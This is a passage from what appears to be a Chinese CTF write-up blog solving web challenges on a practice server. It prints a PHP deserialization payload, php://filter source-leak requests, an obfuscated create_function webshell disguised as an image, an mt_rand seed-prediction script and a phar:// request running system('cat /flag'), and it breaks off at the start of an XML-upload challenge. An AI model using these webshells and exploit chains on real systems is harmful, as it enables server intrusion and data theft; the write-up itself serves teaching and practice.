<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php    </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;    </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;    </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);   </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;  </span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);  </span><br><span class="line">        &#125;    </span><br><span class="line">    &#125;    </span><br><span class="line">&#125;    </span><br><span class="line"><span class="meta">?&gt;</span>    </span><br></pre></td></tr></table></figure>

<p>注释中的flag.php就是我们最后要找的目标。要把useless.php序列化，只需要在最后加上这三行代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> Flag();  </span><br><span class="line"><span class="variable">$a</span>= serialize(<span class="variable">$a</span>);  </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;   </span><br></pre></td></tr></table></figure>

<p>然后执行php文件即可，得到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Flag&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;&#125;  </span><br></pre></td></tr></table></figure>

<p>最后把序列化后的代码放在php伪协议的最后即可得到Payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text=data:<span class="comment">//text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;  </span></span><br></pre></td></tr></table></figure>

<p>得到flag：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/18e4cc866d8e178fe1c146964821fbb5.png"></p>
<h2 id="Guess-（难度：10-10）"><a href="#Guess-（难度：10-10）" class="headerlink" title="Guess （难度：10/10）"></a>Guess （难度：10/10）</h2><p>打开后是一个图片上传页面：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/ca395cc49afa63b5e34fb146e175b4aa.png"></p>
<p>首先用dirsearch扫描目录：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/a24f361596f4e578a3f35872765b11e4.png">没有有用信息，应该只能从上传图片入手。直接上传的话会被直接阻止，过滤应该很严格。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/836aac181b51132b3f96f86a595fcc4b.png"></p>
<p>该页面URL参数为<code>?page=upload</code>，可能存在文件读取等漏洞，试一下伪协议读取源代码。首先试一下读取index主页的源代码，输入<code>http://111.200.241.244:58338/?page=php://filter/convert.base64-encode/resource=index</code>，成功读取：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/f7b55e5e3d1ed72ae18ac7a4848ec1a5.png">Base64解码一下得到主页的源码（下面所有代码我只截取php部分，省略掉前端HTML没有价值的部分）。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">error_reporting(<span class="number">0</span>);  </span><br><span class="line">  </span><br><span class="line">session_start();  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]))&#123;  </span><br><span class="line">    <span class="variable">$page</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="variable">$page</span>=<span class="literal">null</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\.\./&#x27;</span>,<span class="variable">$page</span>))  </span><br><span class="line">&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;div class=\&quot;msg error\&quot; id=\&quot;message\&quot;&gt; </span></span><br><span class="line"><span class="string">    &lt;i class=\&quot;fa fa-exclamation-triangle\&quot;&gt;&lt;/i&gt;Attack Detected!&lt;/div&gt;&quot;</span>;  </span><br><span class="line">    <span class="keyword">die</span>();  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$page</span>)  </span><br><span class="line">&#123;  </span><br><span class="line">    <span class="keyword">if</span>(!(<span class="keyword">include</span>(<span class="variable">$page</span>.<span class="string">&#x27;.php&#x27;</span>)))  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;div class=\&quot;msg error\&quot; id=\&quot;message\&quot;&gt; </span></span><br><span class="line"><span class="string">    &lt;i class=\&quot;fa fa-exclamation-triangle\&quot;&gt;&lt;/i&gt;error!&lt;/div&gt;&quot;</span>;  </span><br><span class="line">        <span class="keyword">exit</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>

<p>可以看到<code>preg_match</code>函数过滤掉了一些字符，并且用<code>include</code>做了一些限制。下面我们来获取upload页面的源代码。输入<code>http://111.200.241.244:58338/?page=php://filter/convert.base64-encode/resource=upload</code>，解码一下便得到了源码，显然包含更多信息。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">error_reporting(<span class="number">0</span>);  </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_error_message</span>(<span class="params"><span class="variable">$message</span></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;div class=\&quot;msg error\&quot; id=\&quot;message\&quot;&gt; </span></span><br><span class="line"><span class="string">    &lt;i class=\&quot;fa fa-exclamation-triangle\&quot;&gt;&lt;/i&gt;<span class="subst">$message</span>&lt;/div&gt;&quot;</span>);  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_message</span>(<span class="params"><span class="variable">$message</span></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;&lt;div class=\&quot;msg success\&quot; id=\&quot;message\&quot;&gt; </span></span><br><span class="line"><span class="string">    &lt;i class=\&quot;fa fa-exclamation-triangle\&quot;&gt;&lt;/i&gt;<span class="subst">$message</span>&lt;/div&gt;&quot;</span>);  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random_str</span>(<span class="params"><span class="variable">$length </span>= <span class="string">&quot;32&quot;</span></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="variable">$set </span>= <span class="keyword">array</span>(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;A&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;B&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;C&quot;</span>, <span class="string">&quot;d&quot;</span>, <span class="string">&quot;D&quot;</span>, <span class="string">&quot;e&quot;</span>, <span class="string">&quot;E&quot;</span>, <span class="string">&quot;f&quot;</span>, <span class="string">&quot;F&quot;</span>,  </span><br><span class="line">        <span class="string">&quot;g&quot;</span>, <span class="string">&quot;G&quot;</span>, <span class="string">&quot;h&quot;</span>, <span class="string">&quot;H&quot;</span>, <span class="string">&quot;i&quot;</span>, <span class="string">&quot;I&quot;</span>, <span class="string">&quot;j&quot;</span>, <span class="string">&quot;J&quot;</span>, <span class="string">&quot;k&quot;</span>, <span class="string">&quot;K&quot;</span>, <span class="string">&quot;l&quot;</span>, <span class="string">&quot;L&quot;</span>,  </span><br><span class="line">        <span class="string">&quot;m&quot;</span>, <span class="string">&quot;M&quot;</span>, <span class="string">&quot;n&quot;</span>, <span class="string">&quot;N&quot;</span>, <span class="string">&quot;o&quot;</span>, <span class="string">&quot;O&quot;</span>, <span class="string">&quot;p&quot;</span>, <span class="string">&quot;P&quot;</span>, <span class="string">&quot;q&quot;</span>, <span class="string">&quot;Q&quot;</span>, <span class="string">&quot;r&quot;</span>, <span class="string">&quot;R&quot;</span>,  </span><br><span class="line">        <span class="string">&quot;s&quot;</span>, <span class="string">&quot;S&quot;</span>, <span class="string">&quot;t&quot;</span>, <span class="string">&quot;T&quot;</span>, <span class="string">&quot;u&quot;</span>, <span class="string">&quot;U&quot;</span>, <span class="string">&quot;v&quot;</span>, <span class="string">&quot;V&quot;</span>, <span class="string">&quot;w&quot;</span>, <span class="string">&quot;W&quot;</span>, <span class="string">&quot;x&quot;</span>, <span class="string">&quot;X&quot;</span>,  </span><br><span class="line">        <span class="string">&quot;y&quot;</span>, <span class="string">&quot;Y&quot;</span>, <span class="string">&quot;z&quot;</span>, <span class="string">&quot;Z&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="string">&quot;2&quot;</span>, <span class="string">&quot;3&quot;</span>, <span class="string">&quot;4&quot;</span>, <span class="string">&quot;5&quot;</span>, <span class="string">&quot;6&quot;</span>, <span class="string">&quot;7&quot;</span>, <span class="string">&quot;8&quot;</span>, <span class="string">&quot;9&quot;</span>);  </span><br><span class="line">    <span class="variable">$str </span>= <span class="string">&#x27;&#x27;</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i </span>= <span class="number">1</span>; <span class="variable">$i </span>&lt;= <span class="variable">$length</span>; ++<span class="variable">$i</span>) &#123;  </span><br><span class="line">        <span class="variable">$ch </span>= mt_rand(<span class="number">0</span>, count(<span class="variable">$set</span>) - <span class="number">1</span>);  </span><br><span class="line">        <span class="variable">$str </span>.= <span class="variable">$set</span>[<span class="variable">$ch</span>];  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$str</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">session_start();  </span><br><span class="line"><span class="variable">$reg</span>=<span class="string">&#x27;/gif|jpg|jpeg|png/&#x27;</span>;  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="variable">$seed </span>= rand(<span class="number">0</span>,<span class="number">999999999</span>);  </span><br><span class="line">    mt_srand(<span class="variable">$seed</span>);  </span><br><span class="line">    <span class="variable">$ss </span>= mt_rand();  </span><br><span class="line">    <span class="variable">$hash </span>= md5(session_id() . <span class="variable">$ss</span>);  </span><br><span class="line">    setcookie(<span class="string">&#x27;SESSI0N&#x27;</span>, <span class="variable">$hash</span>, time() + <span class="number">3600</span>);  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>) &#123;  </span><br><span class="line">        show_error_message(<span class="string">&quot;Upload ERROR. Return Code: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file-upload-field&quot;</span>][<span class="string">&quot;error&quot;</span>]);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="variable">$check2 </span>= (((<span class="variable">$_FILES</span>[<span class="string">&quot;file-upload-field&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/gif&quot;</span>)  </span><br><span class="line">            || (<span class="variable">$_FILES</span>[<span class="string">&quot;file-upload-field&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/jpeg&quot;</span>)  </span><br><span class="line">            || (<span class="variable">$_FILES</span>[<span class="string">&quot;file-upload-field&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/pjpeg&quot;</span>)  </span><br><span class="line">            || (<span class="variable">$_FILES</span>[<span class="string">&quot;file-upload-field&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/png&quot;</span>))  </span><br><span class="line">        &amp;&amp; (<span class="variable">$_FILES</span>[<span class="string">&quot;file-upload-field&quot;</span>][<span class="string">&quot;size&quot;</span>] &lt; <span class="number">204800</span>));  </span><br><span class="line">    <span class="variable">$check3</span>=!preg_match(<span class="variable">$reg</span>,pathinfo(<span class="variable">$_FILES</span>[<span class="string">&#x27;file-upload-field&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], PATHINFO_EXTENSION));  </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$check3</span>) show_error_message(<span class="string">&quot;Nope!&quot;</span>);  </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$check2</span>) &#123;  </span><br><span class="line">        <span class="variable">$filename </span>= <span class="string">&#x27;./uP1O4Ds/&#x27;</span> . random_str() . <span class="string">&#x27;_&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;file-upload-field&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];  </span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;file-upload-field&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$filename</span>)) &#123;  </span><br><span class="line">            show_message(<span class="string">&quot;Upload successfully. File type:&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file-upload-field&quot;</span>][<span class="string">&quot;type&quot;</span>]);  </span><br><span class="line">        &#125; <span class="keyword">else</span> show_error_message(<span class="string">&quot;Something wrong with the upload...&quot;</span>);  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        show_error_message(<span class="string">&quot;only allow gif/jpeg/png files smaller than 200kb!&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>

<p>可以看出过滤机制采用了了严格的白名单限制，并且cookie内的session使用随机种子得到<code>（mt_rand）</code>。另外，我们还得到了文件路径的语法<code>$filename= &#39;./uP1O4Ds/&#39; . random_str() . &#39;_&#39; . \$_FILES[&#39;file-upload-field&#39;][&#39;name&#39;];</code></p>
<p>下面我们制作一个图片马，密码1129，保存为php文件再压缩为zip文件，然后改后缀为jpg：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$dXuD</span>=create_function(chr(<span class="number">01402</span>-<span class="number">01336</span>).chr(<span class="number">01140</span>-<span class="number">0755</span>).base64_decode(<span class="string">&#x27;bw==&#x27;</span>).base64_decode(<span class="string">&#x27;bQ==&#x27;</span>).chr(<span class="number">0146615</span>/<span class="number">01011</span>),chr(<span class="number">01421</span>-<span class="number">01254</span>).base64_decode(<span class="string">&#x27;dg==&#x27;</span>).chr(<span class="number">01550</span>-<span class="number">01407</span>).str_rot13(<span class="string">&#x27;y&#x27;</span>).chr(<span class="number">0x2170</span>/<span class="number">0xd6</span>).chr(<span class="number">030644</span>/<span class="number">0541</span>).chr(<span class="number">0x340</span>-<span class="number">0x2cd</span>).chr(<span class="number">330</span>-<span class="number">219</span>).base64_decode(<span class="string">&#x27;bQ==&#x27;</span>).str_rot13(<span class="string">&#x27;r&#x27;</span>).chr(<span class="number">13653</span>/<span class="number">333</span>).base64_decode(<span class="string">&#x27;Ow==&#x27;</span>));<span class="variable">$dXuD</span>(base64_decode(<span class="string">&#x27;NTc3M&#x27;</span>.<span class="string">&#x27;zEyO0&#x27;</span>.<span class="string">&#x27;BldkF&#x27;</span>.<span class="string">&#x27;sKCRf&#x27;</span>.<span class="string">&#x27;&#x27;</span>.base64_decode(<span class="string">&#x27;VQ==&#x27;</span>).base64_decode(<span class="string">&#x27;RQ==&#x27;</span>).chr(<span class="number">30267</span>/<span class="number">531</span>).base64_decode(<span class="string">&#x27;VA==&#x27;</span>).str_rot13(<span class="string">&#x27;I&#x27;</span>).<span class="string">&#x27;&#x27;</span>.<span class="string">&#x27;&#x27;</span>.chr(<span class="number">969</span>-<span class="number">899</span>).chr(<span class="number">0x2b6</span>-<span class="number">0x243</span>).chr(<span class="number">36720</span>/<span class="number">306</span>).chr(<span class="number">0x11ba3</span>/<span class="number">0x3af</span>).chr(<span class="number">0113110</span>/<span class="number">0712</span>).<span class="string">&#x27;&#x27;</span>.<span class="string">&#x27;I5XSk&#x27;</span>.<span class="string">&#x27;7MTcz&#x27;</span>.<span class="string">&#x27;MTkzN&#x27;</span>.<span class="string">&#x27;js=&#x27;</span>.<span class="string">&#x27;&#x27;</span>));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>上传后抓包，Send to Repeater，为了得到种子，我们要把原来的sessionid清空：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/aa5430fe8464f1402c101ca94d1d606c.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/80c60aeecdf8d49d8d5ce04cf75ec7f2.png"></p>
<p>这样我们就得到了随机数的md5值，在线破解一下：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/48181c60cde03494a7436d8a5f4e8c90.png"></p>
<p>这样就得到了随机数，然后用<code>php_mt_seed</code>爆破种子：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/dc8c91bb034cddf588e9cb82f780c9ae.png"></p>
<p>下面我们用脚本获取文件路径，方法很简单，因为之前的源码泄露已经让我们知道了方法，只要把代码在本地运行一下然后<code>echo</code>输出一下就可以了。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="comment">//   </span></span><br><span class="line"><span class="variable">$arr </span>= <span class="keyword">array</span>(<span class="number">319716295</span>);    </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$arr as</span> <span class="variable">$a</span>) &#123;  </span><br><span class="line">    mt_srand(<span class="variable">$a</span>);  </span><br><span class="line">    <span class="variable">$set </span>= <span class="keyword">array</span>(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;A&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;B&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;C&quot;</span>, <span class="string">&quot;d&quot;</span>, <span class="string">&quot;D&quot;</span>, <span class="string">&quot;e&quot;</span>, <span class="string">&quot;E&quot;</span>, <span class="string">&quot;f&quot;</span>, <span class="string">&quot;F&quot;</span>,  </span><br><span class="line">                 <span class="string">&quot;g&quot;</span>, <span class="string">&quot;G&quot;</span>, <span class="string">&quot;h&quot;</span>, <span class="string">&quot;H&quot;</span>, <span class="string">&quot;i&quot;</span>, <span class="string">&quot;I&quot;</span>, <span class="string">&quot;j&quot;</span>, <span class="string">&quot;J&quot;</span>, <span class="string">&quot;k&quot;</span>, <span class="string">&quot;K&quot;</span>, <span class="string">&quot;l&quot;</span>, <span class="string">&quot;L&quot;</span>,  </span><br><span class="line">                 <span class="string">&quot;m&quot;</span>, <span class="string">&quot;M&quot;</span>, <span class="string">&quot;n&quot;</span>, <span class="string">&quot;N&quot;</span>, <span class="string">&quot;o&quot;</span>, <span class="string">&quot;O&quot;</span>, <span class="string">&quot;p&quot;</span>, <span class="string">&quot;P&quot;</span>, <span class="string">&quot;q&quot;</span>, <span class="string">&quot;Q&quot;</span>, <span class="string">&quot;r&quot;</span>, <span class="string">&quot;R&quot;</span>,  </span><br><span class="line">                 <span class="string">&quot;s&quot;</span>, <span class="string">&quot;S&quot;</span>, <span class="string">&quot;t&quot;</span>, <span class="string">&quot;T&quot;</span>, <span class="string">&quot;u&quot;</span>, <span class="string">&quot;U&quot;</span>, <span class="string">&quot;v&quot;</span>, <span class="string">&quot;V&quot;</span>, <span class="string">&quot;w&quot;</span>, <span class="string">&quot;W&quot;</span>, <span class="string">&quot;x&quot;</span>, <span class="string">&quot;X&quot;</span>,  </span><br><span class="line">                 <span class="string">&quot;y&quot;</span>, <span class="string">&quot;Y&quot;</span>, <span class="string">&quot;z&quot;</span>, <span class="string">&quot;Z&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="string">&quot;2&quot;</span>, <span class="string">&quot;3&quot;</span>, <span class="string">&quot;4&quot;</span>, <span class="string">&quot;5&quot;</span>, <span class="string">&quot;6&quot;</span>, <span class="string">&quot;7&quot;</span>, <span class="string">&quot;8&quot;</span>, <span class="string">&quot;9&quot;</span>);  </span><br><span class="line">    <span class="variable">$str </span>= <span class="string">&#x27;&#x27;</span>;  </span><br><span class="line">    <span class="variable">$ss </span>= mt_rand();  </span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i </span>= <span class="number">1</span>; <span class="variable">$i </span>&lt;= <span class="number">32</span>; ++<span class="variable">$i</span>) &#123;  </span><br><span class="line">        <span class="variable">$ch </span>= mt_rand(<span class="number">0</span>, count(<span class="variable">$set</span>) - <span class="number">1</span>);  </span><br><span class="line">        <span class="variable">$str </span>.= <span class="variable">$set</span>[<span class="variable">$ch</span>];  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">echo</span>  <span class="string">&#x27;http://111.200.241.244:58338/uP1O4Ds/&#x27;</span> . <span class="variable">$str </span>. <span class="string">&#x27;_1.jpg&#x27;</span> .<span class="string">&quot;\n\r&quot;</span>;  </span><br><span class="line">  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/phponline.png"></p>
<p>由于上面的seed不止一个，我们多试几次就可以了。访问后提示图片无法正常显示说明图片存在，则我们的地址是正确的。下面直接使用phar伪协议读取一下我们的图片马即可。</p>
<p>由于该题的hint为“flag在根目录/flag”，所以直接调用系统命令<code>cat /flag</code>可以得到flag，命令如下：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.200.241.244:58338/?page=phar://uP1O4Ds/y7IMaolTI6nB7vWgigVVEA35HrXlKhqc_1.jpg/1&amp;cmd=echo system(&#x27;cat /flag&#x27;);</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/da73a33f7093ea0cf4683f39853c2572.png"></p>
<p>另外，也可以直接用Antsword连接服务器获取，两种方法均可以。</p>
<h2 id="unagi-（难度：8-10）"><a href="#unagi-（难度：8-10）" class="headerlink" title="unagi （难度：8/10）"></a><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/a21a502b363b0b96291149fdf24c25d3.png">unagi （难度：8/10）</h2><p>通过题目页面以及提示“Flag is located at /flag, come get it”可以发现本题应该与某文件上传有关。点击查看example如下：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">users</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span>alice<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">password</span>&gt;</span>passwd1<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>Alice<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">email</span>&gt;</span>alice@fakesite.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">group</span>&gt;</span>CSAW2019<span class="tag">&lt;/<span class="name">group</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span>bob<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">password</span>&gt;</span>passwd2<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span> Bob<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">email</span>&gt;</span>bob@fakesite.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">group</span>&gt;</span>CSAW2019<span class="tag">&lt;/<span class="name">group</span>&gt;</span></span><br><span 